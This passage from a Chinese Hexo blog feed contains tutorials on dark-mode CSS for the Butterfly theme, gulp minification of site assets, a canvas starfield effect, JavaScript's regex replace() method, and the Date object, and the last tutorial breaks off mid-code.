[data-theme=&quot;dark&quot;] #recent-posts &gt; .recent-post-item,</span><br><span class="line">  [data-theme=&quot;dark&quot;] #aside-content .card-widget,</span><br><span class="line">  [data-theme=&quot;dark&quot;] div#post,</span><br><span class="line">  [data-theme=&quot;dark&quot;] div#archive,</span><br><span class="line">  [data-theme=&quot;dark&quot;] div#category,</span><br><span class="line">  [data-theme=&quot;dark&quot;] div#page &#123;</span><br><span class="line">  background: var(--trans-dark);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  /* 夜间模式页脚页头遮罩透明 */</span><br><span class="line">  [data-theme=&quot;dark&quot;] #footer::before &#123;</span><br><span class="line">  background: transparent !important;</span><br><span class="line">  &#125;</span><br><span class="line">  [data-theme=&quot;dark&quot;] #page-header::before &#123;</span><br><span class="line">  background: transparent !important;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  /* 阅读模式 */</span><br><span class="line">  .read-mode #aside-content .card-widget &#123;</span><br><span class="line">  background: rgba(118, 238, 152, 0.5) !important;</span><br><span class="line">  &#125;</span><br><span class="line">  .read-mode div#post &#123;</span><br><span class="line">  background: rgba(114, 227, 146, 0.5) !important;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  /* 夜间模式下的阅读模式 */</span><br><span class="line">  [data-theme=&quot;dark&quot;] .read-mode #aside-content .card-widget &#123;</span><br><span class="line">  background: rgba(25, 25, 25, 0.9) !important;</span><br><span class="line">  color: #ffffff;</span><br><span class="line">  &#125;</span><br><span class="line">  [data-theme=&quot;dark&quot;] .read-mode div#post &#123;</span><br><span class="line">  background: rgba(25, 25, 25, 0.9) !important;</span><br><span class="line">  color: #ffffff;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>主题配置文件_config.butterfly.yml插入CSS文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/night.css?1&quot;&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>gulp 压缩 hexo 博客的静态资源（css、js、html）</title>
    <url>/posts/4be968a2/</url>
    <content><![CDATA[<h1 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h1><p>gulp能够帮助用户自动压缩静态资源，配合各类下属插件，能够压缩包括css、js、html乃至各类格式的图片文件。（图片文件的压缩往往只能节省几十KB，效果远远不如imagine、tinypng等压缩方式，所以此处不再写使用gulp压缩图片的内容）。</p>
<h1 id="配置教程"><a href="#配置教程" class="headerlink" title="配置教程"></a>配置教程</h1><h2 id="安装Gulp插件：在博客根目录-Blogroot-打开终端，输入："><a href="#安装Gulp插件：在博客根目录-Blogroot-打开终端，输入：" class="headerlink" title="安装Gulp插件：在博客根目录[Blogroot]打开终端，输入："></a>安装Gulp插件：在博客根目录[Blogroot]打开终端，输入：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#全局安装gulp指令集</span><br><span class="line">npm install --global gulp-cli</span><br><span class="line">#安装gulp插件</span><br><span class="line">npm install gulp --save</span><br></pre></td></tr></table></figure>
<h2 id="安装各个下属插件以实现对各类静态资源的压缩。"><a href="#安装各个下属插件以实现对各类静态资源的压缩。" class="headerlink" title="安装各个下属插件以实现对各类静态资源的压缩。"></a>安装各个下属插件以实现对各类静态资源的压缩。</h2><p>压缩HTML：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install gulp-htmlclean --save-dev</span><br><span class="line">npm install gulp-html-minifier-terser --save-dev</span><br></pre></td></tr></table></figure>
<h2 id="用gulp-html-minifier-terser可以压缩HTML中的ES6语法"><a href="#用gulp-html-minifier-terser可以压缩HTML中的ES6语法" class="headerlink" title="用gulp-html-minifier-terser可以压缩HTML中的ES6语法"></a>用gulp-html-minifier-terser可以压缩HTML中的ES6语法</h2><p>压缩CSS：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install gulp-clean-css --save-dev</span><br></pre></td></tr></table></figure>
<h2 id="压缩JS"><a href="#压缩JS" class="headerlink" title="压缩JS"></a>压缩JS</h2><p>Butterfly主题文档提供了两种压缩JS的插件方案。两者的差别在于terser是ES6+的JavaScript解析器，而gulp-babel是一个JavaScript转换编译器，可以把ES6转换成ES5，两种方案都有效。但使用上各有利弊。考虑到目前的浏览器市场占有率，更加建议各位使用terser来压缩js。</p>
<h2 id="gulp-terser只会直接压缩js代码，所以不存在因为语法变动导致的错误-。事实上，当我们使用jsdelivr的CDN服务时，只需要在css或者js的后缀前添加-min-例如example-js-example-min-js-JsDelivr就会自动使用terser帮我们压缩好代码。"><a href="#gulp-terser只会直接压缩js代码，所以不存在因为语法变动导致的错误-。事实上，当我们使用jsdelivr的CDN服务时，只需要在css或者js的后缀前添加-min-例如example-js-example-min-js-JsDelivr就会自动使用terser帮我们压缩好代码。" class="headerlink" title="gulp-terser只会直接压缩js代码，所以不存在因为语法变动导致的错误 。事实上，当我们使用jsdelivr的CDN服务时，只需要在css或者js的后缀前添加.min,例如example.js-&gt;example.min.js,JsDelivr就会自动使用terser帮我们压缩好代码。"></a>gulp-terser只会直接压缩js代码，所以不存在因为语法变动导致的错误 。事实上，当我们使用jsdelivr的CDN服务时，只需要在css或者js的后缀前添加.min,例如example.js-&gt;example.min.js,JsDelivr就会自动使用terser帮我们压缩好代码。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install gulp-terser --save-dev</span><br></pre></td></tr></table></figure>
<h2 id="压缩字体包"><a href="#压缩字体包" class="headerlink" title="压缩字体包"></a>压缩字体包</h2><p>字体文件作为最让人又爱又恨的静态资源，为了保证站点文字匹配，全字库字体包往往超过15MB，这对博客的加载速度造成了巨大压力。fontmin可以遍历博客内用到的字符，并将字体包内这些字符的字体样式提取出来输出为新的字体包。</p>
<blockquote>
<p>font-min仅支持压缩ttf格式的字体包</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install gulp-fontmin --save-dev</span><br></pre></td></tr></table></figure>
<p>为Gulp创建gulpfile.js任务脚本。在博客根目录[Blogroot]下新建gulpfile.js,打开[Blogroot]\gulpfile.js,输入以下内容：<br>terser压缩js(推荐)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//用到的各个插件</span><br><span class="line">var gulp = require(&#x27;gulp&#x27;);</span><br><span class="line">var cleanCSS = require(&#x27;gulp-clean-css&#x27;);</span><br><span class="line">var htmlmin = require(&#x27;gulp-html-minifier-terser&#x27;);</span><br><span class="line">var htmlclean = require(&#x27;gulp-htmlclean&#x27;);</span><br><span class="line">var fontmin = require(&#x27;gulp-fontmin&#x27;);</span><br><span class="line">// gulp-tester</span><br><span class="line">var terser = require(&#x27;gulp-terser&#x27;);</span><br><span class="line">// 压缩js</span><br><span class="line">gulp.task(&#x27;compress&#x27;, async() =&gt;&#123;</span><br><span class="line">  gulp.src([&#x27;./public/**/*.js&#x27;, &#x27;!./public/**/*.min.js&#x27;])</span><br><span class="line">    .pipe(terser())</span><br><span class="line">    .pipe(gulp.dest(&#x27;./public&#x27;))</span><br><span class="line">&#125;);</span><br><span class="line">//压缩css</span><br><span class="line">gulp.task(&#x27;minify-css&#x27;, () =&gt; &#123;</span><br><span class="line">    return gulp.src([&#x27;./public/**/*.css&#x27;])</span><br><span class="line">        .pipe(cleanCSS(&#123;</span><br><span class="line">            compatibility: &#x27;ie11&#x27;</span><br><span class="line">        &#125;))</span><br><span class="line">        .pipe(gulp.dest(&#x27;./public&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line">//压缩html</span><br><span class="line">gulp.task(&#x27;minify-html&#x27;, () =&gt; &#123;</span><br><span class="line">    return gulp.src(&#x27;./public/**/*.html&#x27;)</span><br><span class="line">        .pipe(htmlclean())</span><br><span class="line">        .pipe(htmlmin(&#123;</span><br><span class="line">            removeComments: true, //清除html注释</span><br><span class="line">            collapseWhitespace: true, //压缩html</span><br><span class="line">            collapseBooleanAttributes: true,</span><br><span class="line">            //省略布尔属性的值，例如：&lt;input checked=&quot;true&quot;/&gt; ==&gt; &lt;input /&gt;</span><br><span class="line">            removeEmptyAttributes: true,</span><br><span class="line">            //删除所有空格作属性值，例如：&lt;input id=&quot;&quot; /&gt; ==&gt; &lt;input /&gt;</span><br><span class="line">            removeScriptTypeAttributes: true,</span><br><span class="line">            //删除&lt;script&gt;的type=&quot;text/javascript&quot;</span><br><span class="line">            removeStyleLinkTypeAttributes: true,</span><br><span class="line">            //删除&lt;style&gt;和&lt;link&gt;的 type=&quot;text/css&quot;</span><br><span class="line">            minifyJS: true, //压缩页面 JS</span><br><span class="line">            minifyCSS: true, //压缩页面 CSS</span><br><span class="line">            minifyURLs: true  //压缩页面URL</span><br><span class="line">        &#125;))</span><br><span class="line">        .pipe(gulp.dest(&#x27;./public&#x27;))</span><br><span class="line">&#125;);</span><br><span class="line">//压缩字体</span><br><span class="line">function minifyFont(text, cb) &#123;</span><br><span class="line">  gulp</span><br><span class="line">    .src(&#x27;./public/fonts/*.ttf&#x27;) //原字体所在目录</span><br><span class="line">    .pipe(fontmin(&#123;</span><br><span class="line">      text: text</span><br><span class="line">    &#125;))</span><br><span class="line">    .pipe(gulp.dest(&#x27;./public/fontsdest/&#x27;)) //压缩后的输出目录</span><br><span class="line">    .on(&#x27;end&#x27;, cb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gulp.task(&#x27;mini-font&#x27;, (cb) =&gt; &#123;</span><br><span class="line">  var buffers = [];</span><br><span class="line">  gulp</span><br><span class="line">    .src([&#x27;./public/**/*.html&#x27;]) //HTML文件所在目录请根据自身情况修改</span><br><span class="line">    .on(&#x27;data&#x27;, function(file) &#123;</span><br><span class="line">      buffers.push(file.contents);</span><br><span class="line">    &#125;)</span><br><span class="line">    .on(&#x27;end&#x27;, function() &#123;</span><br><span class="line">      var text = Buffer.concat(buffers).toString(&#x27;utf-8&#x27;);</span><br><span class="line">      minifyFont(text, cb);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">// 运行gulp命令时依次执行以下任务</span><br><span class="line">gulp.task(&#x27;default&#x27;, gulp.parallel(</span><br><span class="line">  &#x27;compress&#x27;, &#x27;minify-css&#x27;, &#x27;minify-html&#x27;,&#x27;mini-font&#x27;</span><br><span class="line">))</span><br></pre></td></tr></table></figure>
<h1 id="在每次运行完hexo-generate生成静态页面后，运行gulp对其进行压缩。指令流程如下："><a href="#在每次运行完hexo-generate生成静态页面后，运行gulp对其进行压缩。指令流程如下：" class="headerlink" title="在每次运行完hexo generate生成静态页面后，运行gulp对其进行压缩。指令流程如下："></a>在每次运行完hexo generate生成静态页面后，运行gulp对其进行压缩。指令流程如下：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">gulp</span><br><span class="line">hexo server 或 hexo deploy</span><br></pre></td></tr></table></figure>
<p>关于font-min的补充说明，在本文中，是通过读取所有编译好的html文件（.&#x2F;public&#x2F;**&#x2F;<em>.html）中的字符，然后匹配原有字体包内.&#x2F;public&#x2F;fonts&#x2F;</em>.ttf字体样式，输出压缩后的字体包到.&#x2F;public&#x2F;fontsdest&#x2F;目录。所以最终引用字体的相对路径应该是&#x2F;fontsdest&#x2F;*.ttf。而本地测试时，如果没有运行gulp，自然也就不会输出压缩字体包到public目录，也就看不到字体样式。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 博客星空背景和流星特效</title>
    <url>/posts/bb170f41/</url>
    <content><![CDATA[<h1 id="1-插入Canvas标签"><a href="#1-插入Canvas标签" class="headerlink" title="1. 插入Canvas标签"></a>1. 插入Canvas标签</h1><p>首先打开Butterfly主题的_config.yml文件或者使用HTML直接插入，找到配置文件对应的inject部分，插入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;canvas id=&quot;universe&quot;&gt;&lt;/canvas&gt;</span><br></pre></td></tr></table></figure>
<h1 id="2-创建JS文件"><a href="#2-创建JS文件" class="headerlink" title="2. 创建JS文件"></a>2. 创建JS文件</h1><p>在butterfly&#x2F;source&#x2F;js&#x2F;创建一个universe.js文件，或者添加到自己的js文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function dark() &#123;window.requestAnimationFrame=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame;var n,e,i,h,t=.05,s=document.getElementById(&quot;universe&quot;),o=!0,a=&quot;180,184,240&quot;,r=&quot;226,225,142&quot;,d=&quot;226,225,224&quot;,c=[];function f()&#123;n=window.innerWidth,e=window.innerHeight,i=.216*n,s.setAttribute(&quot;width&quot;,n),s.setAttribute(&quot;height&quot;,e)&#125;function u()&#123;h.clearRect(0,0,n,e);for(var t=c.length,i=0;i&lt;t;i++)&#123;var s=c[i];s.move(),s.fadeIn(),s.fadeOut(),s.draw()&#125;&#125;function y()&#123;this.reset=function()&#123;this.giant=m(3),this.comet=!this.giant&amp;&amp;!o&amp;&amp;m(10),this.x=l(0,n-10),this.y=l(0,e),this.r=l(1.1,2.6),this.dx=l(t,6*t)+(this.comet+1-1)*t*l(50,120)+2*t,this.dy=-l(t,6*t)-(this.comet+1-1)*t*l(50,120),this.fadingOut=null,this.fadingIn=!0,this.opacity=0,this.opacityTresh=l(.2,1-.4*(this.comet+1-1)),this.do=l(5e-4,.002)+.001*(this.comet+1-1)&#125;,this.fadeIn=function()&#123;this.fadingIn&amp;&amp;(this.fadingIn=!(this.opacity&gt;this.opacityTresh),this.opacity+=this.do)&#125;,this.fadeOut=function()&#123;this.fadingOut&amp;&amp;(this.fadingOut=!(this.opacity&lt;0),this.opacity-=this.do/2,(this.x&gt;n||this.y&lt;0)&amp;&amp;(this.fadingOut=!1,this.reset()))&#125;,this.draw=function()&#123;if(h.beginPath(),this.giant)h.fillStyle=&quot;rgba(&quot;+a+&quot;,&quot;+this.opacity+&quot;)&quot;,h.arc(this.x,this.y,2,0,2*Math.PI,!1);else if(this.comet)&#123;h.fillStyle=&quot;rgba(&quot;+d+&quot;,&quot;+this.opacity+&quot;)&quot;,h.arc(this.x,this.y,1.5,0,2*Math.PI,!1);for(var t=0;t&lt;30;t++)h.fillStyle=&quot;rgba(&quot;+d+&quot;,&quot;+(this.opacity-this.opacity/20*t)+&quot;)&quot;,h.rect(this.x-this.dx/4*t,this.y-this.dy/4*t-2,2,2),h.fill()&#125;else h.fillStyle=&quot;rgba(&quot;+r+&quot;,&quot;+this.opacity+&quot;)&quot;,h.rect(this.x,this.y,this.r,this.r);h.closePath(),h.fill()&#125;,this.move=function()&#123;this.x+=this.dx,this.y+=this.dy,!1===this.fadingOut&amp;&amp;this.reset(),(this.x&gt;n-n/4||this.y&lt;0)&amp;&amp;(this.fadingOut=!0)&#125;,setTimeout(function()&#123;o=!1&#125;,50)&#125;function m(t)&#123;return Math.floor(1e3*Math.random())+1&lt;10*t&#125;function l(t,i)&#123;return Math.random()*(i-t)+t&#125;f(),window.addEventListener(&quot;resize&quot;,f,!1),function()&#123;h=s.getContext(&quot;2d&quot;);for(var t=0;t&lt;i;t++)c[t]=new y,c[t].reset();u()&#125;(),function t()&#123;document.getElementsByTagName(&#x27;html&#x27;)[0].getAttribute(&#x27;data-theme&#x27;)==&#x27;dark&#x27;&amp;&amp;u(),window.requestAnimationFrame(t)&#125;()&#125;;</span><br><span class="line">dark()</span><br></pre></td></tr></table></figure>
<p>代码的这一部分要求data-theme也就是主题为dark暗色主题，因此仅在暗色主题生效，随后将js文件添加到配置文件的inject处或者其他需要的位置。</p>
<h1 id="3-CSS样式"><a href="#3-CSS样式" class="headerlink" title="3. CSS样式"></a>3. CSS样式</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 背景宇宙星光  */</span><br><span class="line">#universe&#123;</span><br><span class="line">  display: block;</span><br><span class="line">  position: fixed;</span><br><span class="line">  margin: 0;</span><br><span class="line">  padding: 0;</span><br><span class="line">  border: 0;</span><br><span class="line">  outline: 0;</span><br><span class="line">  left: 0;</span><br><span class="line">  top: 0;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  pointer-events: none;</span><br><span class="line">  z-index: -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>CSS文件也是添加到配置文件的inject处或者其他需要的位置。</p>
<h1 id="4-主题配置文件最后如下："><a href="#4-主题配置文件最后如下：" class="headerlink" title="4. 主题配置文件最后如下："></a>4. 主题配置文件最后如下：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/universe.css?1&quot;&gt;</span><br><span class="line">  bottom:</span><br><span class="line">    - &lt;canvas id=&quot;universe&quot;&gt;&lt;/canvas&gt;</span><br><span class="line">    - &lt;script defer src=&quot;/js/universe.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>js-正则替换字符串 replace() 方法</title>
    <url>/posts/e6cfeda1/</url>
    <content><![CDATA[<p>replace()方法介绍<br>replace()方法执行搜索替换操作。<br>它接收一个正则表达式作为第一个参数, 接收一个替换字符串作为第二个参数。<br>它搜索调用它的字符串, 寻找与指定模式匹配的文本。<br>如果正则表达式带g标志, replace()方法会替换字符串中的所有匹配项; 否则, 它只替换第一个匹配项。<br>如果replace()方法的第一个参数是一个字符串而非正则表达式, 这个方法会按照字面值进行搜索。</p>
<p>简单用法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> text = <span class="string">&#x27;my name is hu,you NAME is zhang&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为字符串是不可修改的对象所以要赋值给一个新变量, 也可以对其重新赋值</span></span><br><span class="line">text = text.<span class="title function_">replace</span>(<span class="regexp">/name/gi</span>,<span class="string">&#x27;like&#x27;</span>); <span class="comment">// 标志g表示全局匹配,标志i表示不区分大小写</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(text); <span class="comment">// my like is hu,you like is zhang</span></span><br></pre></td></tr></table></figure>


<p>不过replace()方法的能力远不止这些。比如在正则表达式中用括号()分组的子表达式是从左到右编号的, 而且正则表达式能记住每个子表达式匹配的文本。如果替换字符串中出现了$符号后面跟一个数字(例如$1代表第一组子表达式), replace()会将这两个字符替换为指定的子表达式匹配的文本。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;abcdeABCDE&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其中$1代表第一组(b),$2代表第二组(c)</span></span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/(b)(c)/gi</span>,<span class="string">&#x27;b$1bc$2c&#x27;</span>);  <span class="comment">// 给b两边来个b,给c两边来个c</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str); <span class="comment">// abbbcccdeAbBbcCcDE</span></span><br></pre></td></tr></table></figure>

<p>如果正则表达式中使用的是命名捕获组, 则可以通过名字而非数字来引用匹配的文本, 如果使用命名捕获组就要把名字写到$&lt;名字&gt;中:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;abcdABCD&#x27;</span>;</span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/(?&lt;group1&gt;bc)/gi</span>,<span class="string">&#x27;[$&lt;group1&gt;]&#x27;</span>); <span class="comment">// 给bc套个中括号</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str); <span class="comment">// a[bc]dA[BC]D</span></span><br></pre></td></tr></table></figure>

<p>重点:函数替换<br>除了给replace()的第二个参数传替换字符串, 还可以传一个函数, 这个函数会被调用然后用来计算替换的值, 如果匹配到多个值则会对每个值进行一次计算替换。这个替换函数在被调用时会接收几个参数, 第一个参数是匹配的整个文本:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;小明有-100元,小李有5元,小张有-10元&#x27;</span>;</span><br><span class="line"><span class="comment">// 对其中的钱进行绝对值操作</span></span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/-?\d+/g</span>,<span class="keyword">function</span>(<span class="params">s</span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> num = <span class="built_in">parseInt</span>(s);</span><br><span class="line">  <span class="keyword">if</span>(num &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// 如果小于0就让它乘-1</span></span><br><span class="line">    num *= -<span class="number">1</span>; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 返回结果对其进行替换</span></span><br><span class="line">  <span class="keyword">return</span> num;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str); <span class="comment">// 小明有100元,小李有5元,小张有10元</span></span><br></pre></td></tr></table></figure>

<p>然后, 如果正则表达式有捕获组, 则后面几个参数分别是这些捕获组匹配的子字符串。对以上代码进行修改:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;小明有-100元,小李有5元,小张有-10元&#x27;</span>;</span><br><span class="line"><span class="comment">// 对其中的钱进行绝对值操作</span></span><br><span class="line">str = str.<span class="title function_">replace</span>(<span class="regexp">/(\d+)|(-\d+)/g</span>,<span class="keyword">function</span>(<span class="params">s,first,last</span>)&#123; </span><br><span class="line">  <span class="comment">// s代表匹配的整个字符串,first代表第一组为正数,last代表第二组为负数</span></span><br><span class="line">  <span class="keyword">if</span>(first)&#123;</span><br><span class="line">    <span class="comment">// 如果正数直接返回</span></span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 如果负数让其乘-1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(last)*-<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str); <span class="comment">// 小明有100元,小李有5元,小张有10元</span></span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于网络<a href="https://blog.csdn.net/qq_45458749/article/details/124596123">Js-正则替换字符串replace()方法</a>，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>coding</category>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>coding</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript/js 关于时间函数的学习，并结合实际业务例子进入加强记忆，附快速获取当天时间函数</title>
    <url>/posts/eaa5a59c/</url>
    <content><![CDATA[<p>JavaScript Date（日期） 对象<br>今天我们重点学习JavaScript中的Date对象。</p>
<p>Date对象用于处理日期和时间。可以通过new关键词来定义Date对象。</p>
<p>获取时间<br>如获取当前系统时间。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now); <span class="comment">//控制台的输出结果为Mon May 09 2022 13:48:39 GMT+0800 (中国标准时间)</span></span><br></pre></td></tr></table></figure>

<p>也可以获取指定参数的时间。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//参数1：年份</span></span><br><span class="line"><span class="comment">//参数2：月份 （注意从0开始）</span></span><br><span class="line"><span class="comment">//参数3：日</span></span><br><span class="line"><span class="comment">//参数4：小时</span></span><br><span class="line"><span class="comment">//参数5：分钟</span></span><br><span class="line"><span class="comment">//参数6：秒</span></span><br><span class="line"><span class="keyword">var</span> date1 = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">2022</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">09</span>,<span class="number">30</span>,<span class="number">00</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(date1);<span class="comment">//控制台的输出结果为Sat Jan 01 2022 09:30:00 GMT+0800 (中国标准时间)</span></span><br><span class="line"><span class="comment">//参数非必填，可按需省略，不填默认为0</span></span><br><span class="line"><span class="keyword">var</span> date2 = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">2022</span>,<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(date2);<span class="comment">//控制台的输出结果为Sun Jan 09 2022 00:00:00 GMT+0800 (中国标准时间)</span></span><br></pre></td></tr></table></figure>

<p>也可以将时间戳作为参数，转化成时间。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> date3 = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">1652076712317</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(date3);<span class="comment">//控制台的输出结果为Mon May 09 2022 14:11:52 GMT+0800 (中国标准时间)</span></span><br></pre></td></tr></table></figure>

<p>当我们获取到时间之后， 可以通过其子函数获取对应的年、月、日、时、分、秒、时间戳等。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="keyword">var</span> year = now.<span class="title function_">getFullYear</span>();<span class="comment">//2022</span></span><br><span class="line"><span class="keyword">var</span> month = now.<span class="title function_">getMonth</span>();<span class="comment">//4 注意 4代表5月份</span></span><br><span class="line"><span class="keyword">var</span> day = now.<span class="title function_">getDate</span>();<span class="comment">//9</span></span><br><span class="line"><span class="keyword">var</span> hour = now.<span class="title function_">getHours</span>(); <span class="comment">// 14, 24小时制</span></span><br><span class="line"><span class="keyword">var</span> minute = now.<span class="title function_">getMinutes</span>(); <span class="comment">// 24</span></span><br><span class="line"><span class="keyword">var</span> second = now.<span class="title function_">getSeconds</span>(); <span class="comment">// 22</span></span><br><span class="line"><span class="keyword">var</span> time = now.<span class="title function_">getTime</span>();<span class="comment">//1652077528307 时间戳</span></span><br></pre></td></tr></table></figure>

<p>格式化时间<br>当我们能够正确拿到时间之后，需要对时间进行格式化，以便更好的在界面上展示，或者使用正确的格式与后台数据进行交互。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now);<span class="comment">//控制台的输出结果为Mon May 09 2022 14:58:53 GMT+0800 (中国标准时间)</span></span><br><span class="line"><span class="keyword">var</span> formatNow = <span class="title function_">formatDate</span>(now);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(formatNow);<span class="comment">//控制台的输出结果为2022-05-09 14:58:53</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">formatDate</span>(<span class="params">time</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (time != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> datetime = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        datetime.<span class="title function_">setTime</span>(time);</span><br><span class="line">        <span class="keyword">var</span> year = datetime.<span class="title function_">getFullYear</span>();</span><br><span class="line">        <span class="keyword">var</span> month = (datetime.<span class="title function_">getMonth</span>() + <span class="number">1</span>) &lt; <span class="number">10</span> ? <span class="string">&quot;0&quot;</span> + (datetime.<span class="title function_">getMonth</span>() + <span class="number">1</span>) : (datetime.<span class="title function_">getMonth</span>() + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">var</span> date = datetime.<span class="title function_">getDate</span>() &lt; <span class="number">10</span> ? <span class="string">&quot;0&quot;</span> + datetime.<span class="title function_">getDate</span>() : datetime.<span class="title function_">getDate</span>();</span><br><span class="line">        <span class="keyword">var</span> hour = datetime.<span class="title function_">getHours</span>() &lt; <span class="number">10</span> ? <span class="string">&quot;0&quot;</span> + datetime.<span class="title function_">getHours</span>() : datetime.<span class="title function_">getHours</span>();</span><br><span class="line">        <span class="keyword">var</span> minute = datetime.<span class="title function_">getMinutes</span>() &lt; <span class="number">10</span> ? <span class="string">&quot;0&quot;</span> + datetime.<span class="title function_">getMinutes</span>() : datetime.<span class="title function_">getMinutes</span>();</span><br><span class="line">        <span class="keyword">var</span> second = datetime.<span class="title function_">getSeconds</span>() &lt; <span class="number">10</span> ? <span class="string">&quot;0&quot;</span> + datetime.<span class="title function_">getSeconds</span>() : datetime.<span class="title function_">getSeconds</span>();</span><br><span class="line">       <span class="comment">//获得正确的年月日时分秒之后，可根据界面要求进行自由组合</span></span><br><span class="line">       <span class="comment">//如需转化成yyyy-mm-dd HH:mm:ss</span></span><br><span class="line">        <span class="keyword">return</span> year + <span class="string">&quot;-&quot;</span> + month + <span class="string">&quot;-&quot;</span> + date + <span class="string">&#x27; &#x27;</span> + hour + <span class="string">&#x27;:&#x27;</span> + minute + <span class="string">&#x27;:&#x27;</span> + second;</span><br><span 